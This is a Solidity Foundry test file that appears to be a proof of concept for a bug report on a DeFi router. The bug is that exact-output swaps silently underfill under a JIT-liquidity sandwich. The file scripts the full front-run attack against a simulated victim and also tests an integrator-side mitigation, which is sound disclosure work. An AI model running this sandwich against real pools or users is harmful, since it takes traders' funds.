// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "solmate/src/tokens/ERC20.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {DeployPermit2} from "permit2/test/utils/DeployPermit2.sol";
import {IAllowanceTransfer} from "permit2/src/interfaces/IAllowanceTransfer.sol";

import {Vault} from "infinity-core/src/Vault.sol";
import {IVault} from "infinity-core/src/interfaces/IVault.sol";
import {CLPoolManager} from "infinity-core/src/pool-cl/CLPoolManager.sol";
import {ICLPoolManager} from "infinity-core/src/pool-cl/interfaces/ICLPoolManager.sol";
import {CLPoolManagerRouter} from "infinity-core/test/pool-cl/helpers/CLPoolManagerRouter.sol";
import {Currency} from "infinity-core/src/types/Currency.sol";
import {PoolKey} from "infinity-core/src/types/PoolKey.sol";
import {IHooks} from "infinity-core/src/interfaces/IHooks.sol";
import {TickMath} from "infinity-core/src/pool-cl/libraries/TickMath.sol";
import {CLPoolParametersHelper} from "infinity-core/src/pool-cl/libraries/CLPoolParametersHelper.sol";

import {IQuoter} from "infinity-periphery/src/interfaces/IQuoter.sol";
import {ICLQuoter} from "infinity-periphery/src/pool-cl/interfaces/ICLQuoter.sol";
import {CLQuoter} from "infinity-periphery/src/pool-cl/lens/CLQuoter.sol";
import {ICLRouterBase} from "infinity-periphery/src/pool-cl/interfaces/ICLRouterBase.sol";
import {IInfinityRouter} from "infinity-periphery/src/interfaces/IInfinityRouter.sol";
import {LiquidityAmounts} from "infinity-periphery/src/pool-cl/libraries/LiquidityAmounts.sol";
import {Plan, Planner} from "infinity-periphery/src/libraries/Planner.sol";
import {Actions} from "infinity-periphery/src/libraries/Actions.sol";
import {ActionConstants} from "infinity-periphery/src/libraries/ActionConstants.sol";

import {UniversalRouter} from "../src/UniversalRouter.sol";
import {RouterParameters} from "../src/base/RouterImmutables.sol";
import {Commands} from "../src/libraries/Commands.sol";

interface IUniversalRouterMin {
    function execute(bytes calldata commands, bytes[] calldata inputs, uint256 deadline) external payable;
}

/// @notice Self-contained PoC for the CL exact-output silent-underfill in CLRouterBase.
///
/// Bug: `CLRouterBase._swapExactOutputSingle` (lib/infinity-periphery/src/pool-cl/CLRouterBase.sol:67-79)
/// only enforces `amountIn <= amountInMaximum`. It never re-reads the pool credit and asserts that
/// the actually-delivered output equals (or exceeds) `params.amountOut`. When the CL pool halts at
/// the boundary `sqrtPriceLimitX96` (set unconditionally on line 123 to `MIN_SQRT_RATIO+1` /
/// `MAX_SQRT_RATIO-1`), `Pool.swap` returns a partial output delta and the router accepts it.
/// The production `Planner.finalizeSwap(MSG_SENDER, ...)` settlement path uses
/// `SETTLE_ALL(MAX) + TAKE_ALL(0)` — its `0` minAmount means TAKE_ALL also won't catch the
/// shortfall.
///
/// Symmetric proof: under the same JIT sandwich, an exact-input swap with `amountOutMinimum`
/// reverts at `_swapExactInputSingle` (line 35-37). The exact-output path is the only one
/// missing the symmetric output check.
contract InfinityCLExactOutputUnderfillTest is Test, DeployPermit2 {
    using Planner for Plan;
    using CLPoolParametersHelper for bytes32;

    int24 internal constant TICK_SPACING = 1;
    uint24 internal constant FEE = 3000;
    int24 internal constant FAIR_TICK = -63973;
    int24 internal constant FAIR_TICK_LOWER = -63974;
    int24 internal constant FAIR_TICK_UPPER = -63972;
    int24 internal constant TOXIC_TICK_LOWER = -70020;
    int24 internal constant TOXIC_TICK_UPPER = -69920;
    bytes32 internal constant TOXIC_SALT = bytes32(uint256(1));

    uint128 internal constant FRONT_RUN_USDT_IN = 3_010 ether;
    uint128 internal constant REQUESTED_WBNB_OUT = 1 ether;
    uint256 internal constant FAIR_USDT_AMOUNT = 3_000 ether;
    uint256 internal constant FAIR_WBNB_AMOUNT = 5 ether;
    uint256 internal constant TOXIC_WBNB_AMOUNT = 0.1 ether;
    uint256 internal constant FUNDING_USDT = 1_000_000 ether;
    uint256 internal constant FUNDING_WBNB = 1_000 ether;

    IVault internal vault;
    ICLPoolManager internal poolManager;
    UniversalRouter internal router;
    IAllowanceTransfer internal permit2;
    CLQuoter internal quoter;
    CLPoolManagerRouter internal operator;
    MockERC20 internal usdt;
    MockERC20 internal wbnb;
    PoolKey internal poolKey;

    address internal alice = makeAddr("alice");
    address internal recipient = makeAddr("recipient");

    function setUp() public {
        permit2 = IAllowanceTransfer(deployPermit2());
        vault = IVault(new Vault());
        poolManager = ICLPoolManager(new CLPoolManager(vault));
        vault.registerApp(address(poolManager));
        quoter = new CLQuoter(address(poolManager));
        operator = new CLPoolManagerRouter(vault, poolManager);

        // Deploy two MockERC20s; ensure the lower-address one becomes USDT (currency0) so the
        // direction (zeroForOne = USDT->WBNB) and tick math stay consistent with the fork test.
        MockERC20 a = new MockERC20("USDT-or-WBNB", "AB", 18);
        MockERC20 b = new MockERC20("USDT-or-WBNB", "AB", 18);
        if (address(a) < address(b)) {
            usdt = a;
            wbnb = b;
        } else {
            usdt = b;
            wbnb = a;
        }

        router = new UniversalRouter(
            RouterParameters({
                permit2: address(permit2),
                weth9: address(wbnb),
                v2Factory: address(0),
                v3Factory: address(0),
                v3Deployer: address(0),
                v2InitCodeHash: bytes32(0),
                v3InitCodeHash: bytes32(0),
                stableFactory: address(0),
                stableInfo: address(0),
                infiVault: address(vault),
                infiClPoolManager: address(poolManager),
                infiBinPoolManager: address(0),
                v3NFTPositionManager: address(0),
                infiClPositionManager: address(0),
                infiBinPositionManager: address(0)
            })
        );

        // Funding & approvals: test contract is the LP / JIT-attacker, alice is the victim.
        usdt.mint(address(this), FUNDING_USDT);
        wbnb.mint(address(this), FUNDING_WBNB);
        usdt.mint(alice, FUNDING_USDT);

        usdt.approve(address(operator), type(uint256).max);
        wbnb.approve(address(operator), type(uint256).max);

        vm.startPrank(alice);
        usdt.approve(address(permit2), type(uint256).max);
        permit2.approve(address(usdt), address(router), type(uint160).max, type(uint48).max);
        vm.stopPrank();

        poolKey = PoolKey({
            currency0: Currency.wrap(address(usdt)),
            currency1: Currency.wrap(address(wbnb)),
            hooks: IHooks(address(0)),
            poolManager: poolManager,
            fee: FEE,
            parameters: bytes32(0).setTickSpacing(TICK_SPACING)
        });

        uint160 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(FAIR_TICK);
        uint160 sqrtFairLower = TickMath.getSqrtRatioAtTick(FAIR_TICK_LOWER);
        uint160 sqrtFairUpper = TickMath.getSqrtRatioAtTick(FAIR_TICK_UPPER);
        uint128 fairLiquidity = LiquidityAmounts.getLiquidityForAmounts(
            sqrtPriceX96, sqrtFairLower, sqrtFairUpper, FAIR_USDT_AMOUNT, FAIR_WBNB_AMOUNT
        );

        poolManager.initialize(poolKey, sqrtPriceX96);
        operator.modifyPosition(
            poolKey,
            ICLPoolManager.ModifyLiquidityParams({
                tickLower: FAIR_TICK_LOWER,
                tickUpper: FAIR_TICK_UPPER,
                liquidityDelta: int256(uint256(fairLiquidity)),
                salt: bytes32(0)
            }),
            bytes("")
        );
    }

    /// @notice Sanity: a clean exact-output swap delivers the full requested output. Confirms wiring.
    function test_exactOutput_clean_works() public {
        uint256 quotedAmountIn = _quoteUsdtForWbnbOut(REQUESTED_WBNB_OUT);
        bytes memory victimInput = _buildPlannerExactOutputInput(quotedAmountIn);

        uint256 wbnbBefore = wbnb.balanceOf(alice);
        _executeAsAlice(victimInput);
        assertEq(wbnb.balanceOf(alice) - wbnbBefore, REQUESTED_WBNB_OUT, "clean did not deliver requested output");
    }

    /// @notice The production `Planner.finalizeSwap` (MSG_SENDER branch -> SETTLE_ALL(MAX) +
    /// TAKE_ALL(0)) silently underfills under a JIT sandwich. This is the integration any SDK
    /// or front-end that follows the docs will produce — the issue is reachable via the
    /// canonical Planner path, not just bespoke action sequences.
    function test_exactOutput_plannerTakeAll_underfills() public {
        uint256 quotedAmountIn = _quoteUsdtForWbnbOut(REQUESTED_WBNB_OUT);
        bytes memory victimInput = _buildPlannerExactOutputInput(quotedAmountIn);
        _assertPlannerTakeAllZero(victimInput);

        _runJitFrontrun();

        uint256 usdtBefore = usdt.balanceOf(alice);
        uint256 wbnbBefore = wbnb.balanceOf(alice);
        _executeAsAlice(victimInput);
        uint256 inputSpent = usdtBefore - usdt.balanceOf(alice);
        uint256 outputReceived = wbnb.balanceOf(alice) - wbnbBefore;

        assertGt(quotedAmountIn, 0, "initial quote failed");
        assertGt(inputSpent, 0, "victim spent no USDT");
        assertLe(inputSpent, quotedAmountIn + 1, "victim exceeded quoted max input");
        assertGt(outputReceived, 0, "victim received no WBNB");
        assertLt(outputReceived, REQUESTED_WBNB_OUT, "exact-output swap did not silently underfill");

        emit log_named_uint("requested WBNB out (wei)", REQUESTED_WBNB_OUT);
        emit log_named_uint("actually received WBNB (wei)", outputReceived);
        emit log_named_uint("USDT spent (wei)", inputSpent);
    }

    /// @notice The Planner's OPEN_DELTA branch (custom recipient -> SETTLE(OPEN_DELTA) +
    /// TAKE(OPEN_DELTA, recipient)) also accepts the partial fill. Both production
    /// `finalizeSwap` branches are vulnerable.
    function test_exactOutput_plannerOpenDelta_underfills() public {
        uint256 quotedAmountIn = _quoteUsdtForWbnbOut(REQUESTED_WBNB_OUT);

        ICLRouterBase.CLSwapExactOutputSingleParams memory params = ICLRouterBase.CLSwapExactOutputSingleParams({
            poolKey: poolKey,
            zeroForOne: true,
            amountOut: REQUESTED_WBNB_OUT,
            amountInMaximum: uint128(quotedAmountIn + 1),
            hookData: bytes("")
        });
        Plan memory plan = Planner.init().add(Actions.CL_SWAP_EXACT_OUT_SINGLE, abi.encode(params));
        bytes memory victimInput = plan.finalizeSwap(poolKey.currency0, poolKey.currency1, recipient);

        _runJitFrontrun();

        uint256 wbnbBefore = wbnb.balanceOf(recipient);
        _executeAsAlice(victimInput);
        uint256 outputReceived = wbnb.balanceOf(recipient) - wbnbBefore;

        assertGt(outputReceived, 0, "no output received");
        assertLt(outputReceived, REQUESTED_WBNB_OUT, "OPEN_DELTA branch did not silently underfill");
    }

    /// @notice Hand-rolled action sequence that replaces TAKE_ALL(0) with TAKE_ALL(amountOut)
    /// correctly reverts (V4-style: caught at the SETTLEMENT layer, not the swap-router layer).
    /// This is the recommended workaround until CLRouterBase enforces an internal output check.
    function test_exactOutput_takeAllAmountOut_reverts() public {
        uint256 quotedAmountIn = _quoteUsdtForWbnbOut(REQUESTED_WBNB_OUT);
        bytes memory victimInput = _buildHandRolledExactOutputInput(quotedAmountIn, REQUESTED_WBNB_OUT);

        _runJitFrontrun();

        bytes memory commands = abi.encodePacked(bytes1(uint8(Commands.INFI_SWAP)));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = victimInput;

        vm.startPrank(alice);
        vm.expectRevert();
        IUniversalRouterMin(address(router)).execute(commands, inputs, block.timestamp + 1);
        vm.stopPrank();
    }

    /// @notice Symmetric proof of asymmetry: under the same JIT sandwich, an exact-input swap
    /// with `amountOutMinimum` reverts at `CLRouterBase._swapExactInputSingle:35-37` with
    /// `TooLittleReceived`. Decode the revert args to prove the check enforces the user's
    /// minimum. The exact-output path simply has no equivalent check.
    function test_exactInput_reverts_under_same_sandwich() public {
        uint256 quotedAmountIn = _quoteUsdtForWbnbOut(REQUESTED_WBNB_OUT);
        uint128 amountOutMinimum = uint128(REQUESTED_WBNB_OUT * 90 / 100);

        ICLRouterBase.CLSwapExactInputSingleParams memory params = ICLRouterBase.CLSwapExactInputSingleParams({
            poolKey: poolKey,
            zeroForOne: true,
            amountIn: uint128(quotedAmountIn),
            amountOutMinimum: amountOutMinimum,
            hookData: bytes("")
        });
        Plan memory plan = Planner.init().add(Actions.CL_SWAP_EXACT_IN_SINGLE, abi.encode(params));
        bytes memory victimInput = plan.finalizeSwap(poolKey.currency0, poolKey.currency1, ActionConstants.MSG_SENDER);

        _runJitFrontrun();

        bytes memory commands = abi.encodePacked(bytes1(uint8(Commands.INFI_SWAP)));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = victimInput;

        vm.startPrank(alice);
        try IUniversalRouterMin(address(router)).execute(commands, inputs, block.timestamp + 1) {
            revert("exact-input swap succeeded under sandwich - expected revert");
        } catch (bytes memory revertData) {
            // The router wraps a failing sub-command in `ExecutionFailed(commandIndex, message)`.
            // Strip that wrapper and assert the inner selector is `TooLittleReceived`.
            bytes memory innerData = _unwrapExecutionFailed(revertData);
            assertGe(innerData.length, 68, "inner revert data too short for TooLittleReceived");
            bytes4 selector;
            uint256 minAmount;
            uint256 actualAmount;
            assembly {
                selector := mload(add(innerData, 32))
                minAmount := mload(add(innerData, 36))
                actualAmount := mload(add(innerData, 68))
            }
            assertEq(selector, IInfinityRouter.TooLittleReceived.selector, "wrong inner revert selector");
            assertEq(minAmount, uint256(amountOutMinimum), "minAmount != amountOutMinimum");
            assertLt(actualAmount, minAmount, "actual output was not below minimum");
        }
        vm.stopPrank();
    }

    function _runJitFrontrun() internal {
        // 1. JIT: add toxic liquidity at distant tick range.
        uint128 toxicLiquidity = LiquidityAmounts.getLiquidityForAmount1(
            TickMath.getSqrtRatioAtTick(TOXIC_TICK_LOWER),
            TickMath.getSqrtRatioAtTick(TOXIC_TICK_UPPER),
            TOXIC_WBNB_AMOUNT
        );
        operator.modifyPosition(
            poolKey,
            ICLPoolManager.ModifyLiquidityParams({
                tickLower: TOXIC_TICK_LOWER,
                tickUpper: TOXIC_TICK_UPPER,
                liquidityDelta: int256(uint256(toxicLiquidity)),
                salt: TOXIC_SALT
            }),
            bytes("")
        );

        // 2. Front-run: drain fair-range liquidity by pushing price to the toxic-range boundary.
        operator.swap(
            poolKey,
            ICLPoolManager.SwapParams({
                zeroForOne: true,
                amountSpecified: -int256(uint256(FRONT_RUN_USDT_IN)),
                sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO + 1
            }),
            CLPoolManagerRouter.SwapTestSettings({withdrawTokens: true, settleUsingTransfer: true}),
            bytes("")
        );
    }

    function _executeAsAlice(bytes memory victimInput) internal {
        bytes memory commands = abi.encodePacked(bytes1(uint8(Commands.INFI_SWAP)));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = victimInput;

        vm.prank(alice);
        IUniversalRouterMin(address(router)).execute(commands, inputs, block.timestamp + 1);
    }

    /// @dev Builds the canonical Planner.finalizeSwap(MSG_SENDER) plan: the production library
    /// emits `SETTLE_ALL(MAX) + TAKE_ALL(0)` — the buggy pattern the bug report is about.
    function _buildPlannerExactOutputInput(uint256 quotedAmountIn) internal view returns (bytes memory) {
        ICLRouterBase.CLSwapExactOutputSingleParams memory params = ICLRouterBase.CLSwapExactOutputSingleParams({
            poolKey: poolKey,
            zeroForOne: true,
            amountOut: REQUESTED_WBNB_OUT,
            amountInMaximum: uint128(quotedAmountIn + 1),
            hookData: bytes("")
        });
        Plan memory plan = Planner.init().add(Actions.CL_SWAP_EXACT_OUT_SINGLE, abi.encode(params));
        return plan.finalizeSwap(poolKey.currency0, poolKey.currency1, ActionConstants.MSG_SENDER);
    }

    /// @dev Hand-rolled action sequence with `TAKE_ALL(takeAllMin)` instead of `TAKE_ALL(0)`.
    /// Used to demonstrate the integrator-side mitigation.
    function _buildHandRolledExactOutputInput(uint256 quotedAmountIn, uint256 takeAllMin)
        internal
        view
        returns (bytes memory)
    {
        ICLRouterBase.CLSwapExactOutputSingleParams memory params = ICLRouterBase.CLSwapExactOutputSingleParams({
            poolKey: poolKey,
            zeroForOne: true,
            amountOut: REQUESTED_WBNB_OUT,
            amountInMaximum: uint128(quotedAmountIn + 1),
            hookData: bytes("")
        });

        bytes memory actions = abi.encodePacked(
            bytes1(uint8(Actions.CL_SWAP_EXACT_OUT_SINGLE)),
            bytes1(uint8(Actions.SETTLE_ALL)),
            bytes1(uint8(Actions.TAKE_ALL))
        );
        bytes[] memory actionParams = new bytes[](3);
        actionParams[0] = abi.encode(params);
        actionParams[1] = abi.encode(poolKey.currency0, type(uint256).max);
        actionParams[2] = abi.encode(poolKey.currency1, takeAllMin);

        return abi.encode(actions, actionParams);
    }

    function _assertPlannerTakeAllZero(bytes memory data) internal {
        (bytes memory actions, bytes[] memory params) = abi.decode(data, (bytes, bytes[]));
        assertEq(actions.length, 3, "unexpected action count");
        assertEq(uint8(actions[0]), uint8(Actions.CL_SWAP_EXACT_OUT_SINGLE), "expected CL_SWAP_EXACT_OUT_SINGLE");
        assertEq(uint8(actions[1]), uint8(Actions.SETTLE_ALL), "Planner used unexpected settle action");
        assertEq(uint8(actions[2]), uint8(Actions.TAKE_ALL), "Planner used unexpected take action");
        (, uint256 takeMin) = abi.decode(params[2], (address, uint256));
        assertEq(takeMin, 0, "Planner.finalizeSwap should pin TAKE_ALL minAmount to 0 (the bug)");
    }

    function _quoteUsdtForWbnbOut(uint128 wbnbOut) internal returns (uint256 quotedUsdtIn) {
        if (wbnbOut == 0) return 0;
        (quotedUsdtIn,) = quoter.quoteExactOutputSingle(
            IQuoter.QuoteExactSingleParams({
                poolKey: poolKey,
                zeroForOne: true,
                exactAmount: wbnbOut,
                hookData: bytes("")
            })
        );
    }

    /// @dev `UniversalRouter.execute` wraps a failing sub-command in
    /// `ExecutionFailed(uint256 commandIndex, bytes message)`. Strip that wrapper to expose the
    /// underlying selector + args.
    function _unwrapExecutionFailed(bytes memory revertData) internal pure returns (bytes memory inner) {
        if (revertData.length < 4) return revertData;
        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }
        // ExecutionFailed.selector — decode the tail and pull `message`.
        if (selector == bytes4(keccak256("ExecutionFailed(uint256,bytes)"))) {
            bytes memory tail = new bytes(revertData.length - 4);
            for (uint256 i = 0; i < tail.length; i++) {
                tail[i] = revertData[i + 4];
            }
            (, inner) = abi.decode(tail, (uint256, bytes));
            return inner;
        }
        return revertData;
    }
}
